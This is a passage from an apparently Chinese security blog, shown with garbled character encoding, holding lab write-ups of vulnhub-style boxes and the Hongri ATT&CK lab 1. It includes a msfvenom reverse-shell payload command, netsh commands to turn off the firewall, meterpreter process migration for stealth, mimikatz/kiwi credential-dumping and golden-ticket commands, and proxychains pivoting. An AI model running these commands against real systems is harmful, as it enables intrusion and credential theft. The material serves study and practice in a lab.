zipç±»å‹ï¼Œè¯´æ˜ç½‘ç«™ç›®å½•åº”è¯¥å­˜åœ¨zipæ–‡ä»¶</p><p>ç›®å½•æ‰«æ</p><p>dirserach</p><p><img src="/../images/image-20230307142511029-1686283466996.png" alt="image-20230307142511029"></p><p>gobuster</p><p><img src="/../images/image-20230307142447064-1686283466996.png" alt="image-20230307142447064"></p><p>è®¿é—®&#x2F;spammerä¸‹è½½å¾—åˆ°spammer.zip</p><p>ä½¿ç”¨johnçˆ†ç ´</p><p><img src="/../images/image-20230307142628410-1686283466997.png" alt="image-20230307142628410"></p><p>è§£å‹å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>è®¿é—®ç½‘ç«™</p><p><img src="/../images/image-20230307141958670-1686283466997.png" alt="image-20230307141958670"></p><p>å°è¯•ç™»å½•è§£å‹å¾—åˆ°çš„ç”¨æˆ·ï¼ŒæˆåŠŸç™»å½•</p><p><img src="/../images/image-20230307142917723-1686283466997.png" alt="image-20230307142917723"></p><p>é€›äº†ä¸€åœˆå‘ç°ï¼Œé¡µé¢ç¼–è¾‘ï¼Œé‚®ç®±æ³„éœ²ï¼Œæ’ä»¶ï¼ˆæ— æ³•åŠ è½½ä½œç½¢ï¼‰ã€‚</p><ul><li><p>ç½‘ç«™é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62)</span><br><span class="line">Last update: 2020-09-13 19:56:06</span><br><span class="line">Site URL: 192.168.2.35/textpattern</span><br><span class="line">Admin URL: 192.168.2.35/textpattern/textpattern</span><br><span class="line">Document root: /var/www</span><br><span class="line">$path_to_site: /var/www/textpattern</span><br><span class="line">Textpattern path: /var/www/textpattern/textpattern</span><br><span class="line">Article URL pattern: messy</span><br><span class="line">Production status: testing</span><br><span class="line">Temporary directory path: /tmp</span><br><span class="line">PHP version: 5.5.38-1~dotdeb+7.1</span><br><span class="line">GD Graphics Library: Unavailable</span><br><span class="line">Server timezone: UTC</span><br><span class="line">Server local time: 2023-03-07 14:40:29</span><br><span class="line">Daylight Saving Time enabled?: 0</span><br><span class="line">Automatically adjust Daylight Saving Time setting?: 1</span><br><span class="line">Time zone (GMT offset in seconds): Asia/BaghdadÂ (10800)</span><br><span class="line">MySQL: 5.5.47-0+deb7u1 ((Debian)) </span><br><span class="line">Database server time: 2023-03-07 08:40:29</span><br><span class="line">Database server time offset: 0 s</span><br><span class="line">Database server timezone: SYSTEM</span><br><span class="line">Database session timezone: SYSTEM</span><br><span class="line">Locale: C</span><br><span class="line">Site / Admin language: en / en</span><br><span class="line">Web server: Apache/2.2.22 (Debian)</span><br><span class="line">Apache version: Apache/2.2.22 (Debian)</span><br><span class="line">PHP server API: apache2handler</span><br><span class="line">RFC 2616 headers: </span><br><span class="line">Server OS: Linux 3.2.0-4-amd64</span><br><span class="line">Admin-side theme: hiveÂ 4.8.3</span><br><span class="line"></span><br><span class="line">Pre-flight check: </span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">New Textpattern version 4.8.8 available for download.Â Help</span><br><span class="line"></span><br><span class="line">DNS lookup failed: 192.168.2.35Â Help</span><br><span class="line"></span><br><span class="line">/var/www/textpattern/textpattern/setup/ still exists.Â Help</span><br><span class="line"></span><br><span class="line">Site URL preference might be incorrect: 192.168.174.159/textpatternÂ Help</span><br><span class="line"></span><br><span class="line">Image directory is not writable: /var/www/textpattern/images</span><br><span class="line">Theme directory is not writable: /var/www/textpattern/themes</span><br><span class="line">Plugin directory is not writable: /var/www/textpattern/textpattern/pluginsÂ Help</span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">.htaccess file contents: </span><br><span class="line">------------------------</span><br><span class="line"># BEGIN Textpattern</span><br><span class="line"></span><br><span class="line">#DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Enable the `FollowSymLinks` option below if it isn&#x27;t already.</span><br><span class="line">    #Options +FollowSymlinks</span><br><span class="line"></span><br><span class="line">    #RewriteBase /relative/web/path/</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f [OR]</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">    RewriteRule ^(.+) - [PT,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !=/favicon.ico</span><br><span class="line">    RewriteRule ^(.*) index.php</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125;  !^$</span><br><span class="line">    RewriteRule .* - [E=REMOTE_USER:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_mime.c&gt;</span><br><span class="line">    AddType image/svg+xml  svg svgz</span><br><span class="line">    AddEncoding gzip       svgz</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># For additional Apache-compatible web server configuration settings to enhance</span><br><span class="line"># site performance and security, we recommend:</span><br><span class="line"># https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess</span><br><span class="line"></span><br><span class="line"># END Textpattern</span><br><span class="line"></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ </p><p>å¯ä»¥ç›´æ¥ä¸Šä¼ ğŸï¼Œæ— ä»»ä½•é˜²æŠ¤</p><p>æ¼æ´åˆ†æï¼š<a href="https://blog.csdn.net/yun2diao/article/details/92765372">https://blog.csdn.net/yun2diao/article/details/92765372</a></p><p>åå¼¹shell</p><img src="../../../typora img/image-20230307151417930.png" alt="image-20230307151417930" style="zoom:80%;" /></li></ul><p>ææƒ</p><p>ä¸Šä¼ linepeas.shæŸ¥æ‰¾å¯ææƒé¡¹</p><p>è¿™é‡ŒæŸ¥æ‰¾CVE</p><p><img src="/../images/image-20230307153044644-1686283466997.png" alt="image-20230307153044644"></p><p>é€‰æ‹©ä¸€ä¸ªcveè¿›è¡Œææƒï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯è„ç‰›ææƒ<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p><img src="/../images/image-20230307154757476-1686283466997.png" alt="image-20230307154757476"></p><p><img src="/../images/image-20230307154831929-1686283466997.png" alt="image-20230307154831929"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/../images/image-20230307182708576-1686283466997.png" alt="image-20230307182708576"></p><p><img src="/../images/image-20230307182726635-1686283466997.png" alt="image-20230307182726635"></p><p>å¼€æ”¾äº†å¾ˆå¤šç«¯å£å’ŒæœåŠ¡ï¼Œä¸åŒç«¯å£ä¸Šéƒ½æœ‰ç½‘ç«™ï¼Œæ‰€ä»¥ç›®å½•æ‰«ææ—¶éœ€è¦æ³¨æ„æ‰«å“ªä¸ªç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66</span><br><span class="line">80</span><br><span class="line">8086</span><br></pre></td></tr></table></figure><ul><li><p>80ç«¯å£</p><p><img src="/../images/image-20230307224547682-1686283466997.png" alt="image-20230307224547682"></p><p>msfä¸€æ¡é¾™</p></li></ul><p><img src="/../images/image-20230307224427084-1686283466997.png" alt="image-20230307224427084"></p><p><img src="/../images/image-20230307224412649-1686283466997.png" alt="image-20230307224412649"></p><ul><li><p>66ç«¯å£</p><p>dirsearchæ‰«æç»“æœ</p><p><img src="/../images/image-20230307224912102-1686283466997.png" alt="image-20230307224912102"></p><p><img src="/../images/image-20230307224854194-1686283466998.png" alt="image-20230307224854194"></p><p>â€‹å†å²å‘½ä»¤æ“ä½œ.bash_historyé‡è¦éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line">mv root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ä»åˆ«çš„ä¸»æœºä¸Šå¤åˆ¶äº†flagï¼Œå¹¶é‡åä¸ºflag.txt</p></li><li><p>8086</p><p><img src="/../images/image-20230307225845372-1686283466998.png" alt="image-20230307225845372"></p><p>éƒ½æ˜¯é™æ€é¡µé¢</p></li></ul><p>è¿™é‡Œçœ‹äº†wpæ­£å¸¸æ˜¯ä»66ç«¯å£ç›®å½•æ‰«æå‡º&#x2F;enoç›®å½•ï¼Œä¸‹è½½å¹¶ç ´è§£zipå‹ç¼©åŒ…ï¼Œè·å¾—80ç«¯å£çš„ç”¨æˆ·å‡­è¯çš„ã€‚ã€‚</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰8</p><p><img src="/../images/image-20230307232027664-1686283466998.png" alt="image-20230307232027664"></p><p>ç½‘ç«™</p><p>åªæœ‰ä¸€ä¸ªç™»å½•æ¡†</p><p>sqlæ³¨å…¥å¤±è´¥ï¼Œå¼±å£ä»¤çˆ†ç ´å¤±è´¥</p><p>ç›®å½•æ‰«æ</p><p><img src="/../images/image-20230307234601067-1686283466998.png" alt="image-20230307234601067"></p><p>çœ‹åˆ°backupè¿˜ä»¥ä¸ºæœ‰å¤‡ä»½æ–‡ä»¶å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†æ˜¯æ²¡æœ‰ï¼›</p><p>è®¿é—®&#x2F;admin&#x2F;home.phpå°è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒï¼Œå‘ç°æ²¡æœ‰ã€‚</p><p>å¯»æ‰¾ç½‘ç«™æ¡†æ¶æ¼æ´ </p><p><img src="/../images/image-20230307234835760-1686283466999.png" alt="image-20230307234835760"></p><p>å°è¯•äº†ä¹‹åå‘ç°åªå­˜åœ¨rceæ¼æ´</p><p><img src="/../images/image-20230307233410737-1686283466999.png" alt="image-20230307233410737"></p><p><img src="/../images/image-20230307233603248-1686283466999.png" alt="image-20230307233603248"></p><p><img src="/../images/image-20230307233643324-1686283466999.png" alt="image-20230307233643324"></p><p>ä½¿ç”¨ç¬¬äºŒä¸ªpyè„šæœ¬</p><p><img src="/../images/image-20230308001806203-1686283466999.png" alt="image-20230308001806203"></p><p><img src="/../images/image-20230308001820794-1686283466999.png" alt="image-20230308001820794"></p><p>è¿™ä¸ªè„šæœ¬å¾ˆè´´å¿ƒåœ°ç»™å‡ºäº†æœåŠ¡å™¨ä¿¡æ¯ï¼Œå¹¶è¯»å–äº†é…ç½®æ–‡ä»¶ï¼Œè·å¾—äº†claptonç”¨æˆ·çš„å‡­è¯ã€‚</p><p><img src="/../images/image-20230307234930848-1686283467000.png" alt="image-20230307234930848"></p><p>å‘ç°å¤§éƒ¨åˆ†å‘½ä»¤æ˜æ˜å¯ä»¥ä½¿ç”¨çš„å´éƒ½æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥éœ€è¦åå¼¹shellåˆ°kaliï¼Œç»æµ‹è¯•å¯ä»¥ä½¿ç”¨ncè¿›è¡Œåå¼¹shell</p><p><img src="/../images/image-20230308130950848-1686283467000.png" alt="image-20230308130950848"></p><p>ä½¿ç”¨pythonåˆ‡æ¢ä¸ºäº¤äº’å¼shellï¼Œåˆ‡æ¢åˆ°claptonç”¨æˆ·</p><p><img src="/../images/image-20230308131017546-1686283467000.png" alt="image-20230308131017546"></p><p>å‘ç°claptonå®¶ç›®å½•ä¸‹æœ‰note.txt</p><p><img src="/../images/image-20230308131125354-1686283467000.png" alt="image-20230308131125354"></p><p>è¯»å–</p><p><img src="/../images/image-20230308131243068-1686283467000.png" alt="image-20230308131243068"></p><p>æç¤ºæˆ‘ä»¬ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ææƒï¼Œè¿™éƒ¨åˆ†pwnä¸ä¼š</p><p>æŒ‰ç…§ä¸‹é¢æ–‡ç« ä¸­çš„æ–¹æ³•è¿›è¡Œå¤ç°</p><p><a href="https://zhuanlan.zhihu.com/p/570218595">https://zhuanlan.zhihu.com/p/570218595</a></p><p>æœ€åè´´ä¸Šå¤ç°æˆåŠŸçš„æˆªå›¾</p><p><img src="/../images/image-20230308130938122-1686283467000.png" alt="image-20230308130938122"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥ATTC&amp;CKé¶åœº1</title>
      <link href="/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é€šè¿‡MSFå¯¹çº¢æ—¥é¶åœº1è¿›è¡Œå†…ç½‘æ¸—é€</p><p>è·å¾—æœåŠ¡å™¨æƒé™å°±ä¸å†™äº†</p></blockquote><h2 id="è·å¾—å¤–ç½‘ä¸»æœºæƒé™"><a href="#è·å¾—å¤–ç½‘ä¸»æœºæƒé™" class="headerlink" title="è·å¾—å¤–ç½‘ä¸»æœºæƒé™"></a>è·å¾—å¤–ç½‘ä¸»æœºæƒé™</h2><h3 id="æœ¨é©¬ç”Ÿæˆ"><a href="#æœ¨é©¬ç”Ÿæˆ" class="headerlink" title="æœ¨é©¬ç”Ÿæˆ"></a>æœ¨é©¬ç”Ÿæˆ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128  -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><p><strong>reverse_tcpä¸bind_tcpçš„åŒºåˆ«</strong></p><p><img src="/../images/1605154-20200928100839725-1360637319-1686283281460.png" alt="img"></p><h3 id="é˜²ç«å¢™å…³é—­"><a href="#é˜²ç«å¢™å…³é—­" class="headerlink" title="é˜²ç«å¢™å…³é—­"></a>é˜²ç«å¢™å…³é—­</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li><p>æŸ¥çœ‹çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ”¹çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofile state on/off</span><br></pre></td></tr></table></figure><p>ä¸å…³çš„è¯ï¼Œæ‰§è¡Œæœ¨é©¬å°±ä¼šå¼¹å‡ºè¿™ä¸ª</p><p><img src="/../images/image-20230324195048832-1686283281461.png" alt="image-20230324195048832"></p></li></ul><h3 id="è·å¾—ä¸»æœºsession"><a href="#è·å¾—ä¸»æœºsession" class="headerlink" title="è·å¾—ä¸»æœºsession"></a>è·å¾—ä¸»æœºsession</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp # è¦è®¾ç½®æœ¨é©¬çš„ç”Ÿæˆpayloadï¼Œä¸ç„¶è¿ä¸ä¸Š</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324151026344-1686283281461.png" alt="image-20230324151026344"></p><h2 id="ä¿¡æ¯æ”¶é›†ç­‰"><a href="#ä¿¡æ¯æ”¶é›†ç­‰" class="headerlink" title="ä¿¡æ¯æ”¶é›†ç­‰"></a>ä¿¡æ¯æ”¶é›†ç­‰</h2><h4 id="è¿›ç¨‹è¿ç§»"><a href="#è¿›ç¨‹è¿ç§»" class="headerlink" title="è¿›ç¨‹è¿ç§»"></a>è¿›ç¨‹è¿ç§»</h4><ol><li><p>éšè”½è‡ªèº«</p><p>é€‰æ‹©æ³¨å…¥åˆ°explorer.exeè¿›ç¨‹ä¸­</p><blockquote><p>explorer.exeæ˜¯<a href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>ç¨‹åºç®¡ç†å™¨æˆ–è€…<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/58635296?fromModule=lemma_inlink">æ–‡ä»¶èµ„æºç®¡ç†å™¨</a>ï¼Œå®ƒç”¨äºç®¡ç†Windowså›¾å½¢å£³ï¼ŒåŒ…æ‹¬æ¡Œé¢å’Œ<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1452357?fromModule=lemma_inlink">æ–‡ä»¶ç®¡ç†</a>ï¼Œåˆ é™¤è¯¥ç¨‹åºä¼šå¯¼è‡´Windows<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283?fromModule=lemma_inlink">å›¾å½¢ç•Œé¢</a>æ— æ³•ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps | grep &quot;explore&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324152046245-1686283281461.png" alt="image-20230324152046245"></p></li><li><p>åˆ‡æ¢è¿›ç¨‹ä½æ•°</p><blockquote><p>ä¸åŒçš„ç¨‹åºéœ€è¦çš„ä½æ•°ä¸åŒ</p><p>å¦‚ï¼šhashdumpï¼Œkiwiåªèƒ½åœ¨64ä½è¿›ç¨‹ä¸Šæ‰§è¡Œ</p></blockquote></li></ol><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><blockquote><p>å…ˆè·å–åˆ°administratoræƒé™</p><p>å†ä½¿ç”¨getsystemå‘½ä»¤è·å–systemæƒé™</p></blockquote><p><img src="/../images/image-20230324152320920-1686283281461.png" alt="image-20230324152320920"></p><h4 id="ä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#ä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸»æœºä¿¡æ¯æ”¶é›†"></a>ä¸»æœºä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸»æœºä¿¡æ¯</span></span><br><span class="line">ps</span><br><span class="line">sysinfo</span><br><span class="line">run post/windows/gather/enum_applications # å®‰è£…çš„åº”ç”¨</span><br><span class="line">run post/windows/gather/enum_patches # å®‰è£…çš„è¡¥ä¸</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç½‘ç»œ</span></span><br><span class="line">route</span><br><span class="line">arp</span><br><span class="line">netstat â€“ano</span><br><span class="line"></span><br><span class="line">shell </span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><h4 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324155246737-1686283281461.png" alt="image-20230324155246737"></p><p>ä¸»æœºshellä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001 #è§£å†³ä¹±ç </span><br><span class="line">ipconfig /all # DNSåç¼€åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨</span><br><span class="line">net time /domain # åˆ¤æ–­åŸŸæ§</span><br><span class="line">nslookup time_domain # è·å–åŸŸæ§ip</span><br></pre></td></tr></table></figure><h4 id="å¯†ç è·å–"><a href="#å¯†ç è·å–" class="headerlink" title="å¯†ç è·å–"></a>å¯†ç è·å–</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">lsa_dump_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="è°ƒç”¨mimikatz"><a href="#è°ƒç”¨mimikatz" class="headerlink" title="è°ƒç”¨mimikatz"></a>è°ƒç”¨mimikatz</h5><blockquote><p>åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatzå‘½ä»¤</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">åæ¸—é€]Mimikatzä½¿ç”¨å¤§å…¨ - è‚–æ´‹è‚–æ©ã€ - åšå®¢å›­</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h4 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1234 -p 4444 -r 192.168.41.129</span><br></pre></td></tr></table></figure><h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><h3 id="Venomä»£ç†"><a href="#Venomä»£ç†" class="headerlink" title="Venomä»£ç†"></a>Venomä»£ç†</h3><p><a href="https://blog.csdn.net/u011215939/article/details/103403545">å†…ç½‘ç©¿é€å·¥å…·â€”Venomä½¿ç”¨æ•™ç¨‹</a></p><p><img src="/../images/image-20230331194420393-1686283281461.png" alt="image-20230331194420393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks port</span><br><span class="line">ç„¶åé…åˆproxychainsä½¿ç”¨</span><br></pre></td></tr></table></figure><h3 id="socketsä»£ç†"><a href="#socketsä»£ç†" class="headerlink" title="socketsä»£ç†"></a>socketsä»£ç†</h3><h4 id="MSFé…ç½®"><a href="#MSFé…ç½®" class="headerlink" title="MSFé…ç½®"></a>MSFé…ç½®</h4><ul><li>ä¸ºå½“å‰sesisonæ·»åŠ è·¯ç”±</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170547279-1686283281461.png" alt="image-20230324170547279"></p><ul><li><p>ä½¿ç”¨socks5æ¨¡å—</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170759790-1686283281461.png" alt="image-20230324170759790"></p><p>è¿™é‡Œéœ€è¦æŒ‰ä¸€ä¸‹å›è½¦</p><ul><li>æŸ¥çœ‹jobs <img src="/../images/image-20230324170854437-1686283281462.png" alt="image-20230324170854437"></li></ul></li></ul><h4 id="kalié…ç½®"><a href="#kalié…ç½®" class="headerlink" title="kalié…ç½®"></a>kalié…ç½®</h4><blockquote><p>è®©kaliä¸­çš„å…¶ä»–å·¥å…·ä¹Ÿå¯è®¿é—®å†…ç½‘ä¸»æœº</p></blockquote><ul><li><p>å®‰è£…proxychains</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¾‘é…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§infoç»™å‡ºçš„ä¿¡æ¯ï¼Œæ·»åŠ socketä»£ç†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VERSION SRVHOST SRVPORT USERNAME PASSWORD</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324171113565-1686283281462.png" alt="image-20230324171113565"></p></li></ul><p><img src="/../images/image-20230324170936060-1686283281462.png" alt="image-20230324170936060"></p><h3 id="ä¸»æœºæ‰«æ"><a href="#ä¸»æœºæ‰«æ" class="headerlink" title="ä¸»æœºæ‰«æ"></a>ä¸»æœºæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure><h3 id="ç«¯å£å’Œæ¼æ´æ‰«æ"><a href="#ç«¯å£å’Œæ¼æ´æ‰«æ" class="headerlink" title="ç«¯å£å’Œæ¼æ´æ‰«æ"></a>ç«¯å£å’Œæ¼æ´æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¸Šä¼ fscanè¿›è¡Œæ‰«æ</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC  192.168.52.141</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šsocks5ä»£ç†-Pn -sTï¼Œä¸æ”¯æŒicmpåè®®</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ ¹æ®fscançš„æ‰«æç»“æœå¯ä»¥çŸ¥é“åŸŸä¸­ä¸‰å°ä¸»æœºå‡å­˜åœ¨ms17_010æ¼æ´</p><p>åˆ©ç”¨</p><p><img src="/../images/image-20230324192937093-1686283281462.png" alt="image-20230324192937093"></p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°åªèƒ½ç”¨<code>admin/smb/ms17_010_command</code></p><p>åœ¨Windows2003ä¸»æœºä¸Š</p><p><img src="/../images/image-20230330141915854-1686283281462.png" alt="image-20230330141915854"></p><p>æ·»åŠ æˆåŠŸ</p><p><img src="/../images/image-20230330142326253-1686283281462.png" alt="image-20230330142326253"></p><p>åŒç†åŸŸæ§server2008ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥payload</p><h4 id="ipc-è¿æ¥"><a href="#ipc-è¿æ¥" class="headerlink" title="ipc$è¿æ¥"></a>ipc$è¿æ¥</h4><blockquote><p><code>IPC$(Internet Process Connection)</code>æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å¯ä»¥åˆ©ç”¨å®ƒäº§ç”Ÿæ•°æ®äº¤äº’ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç 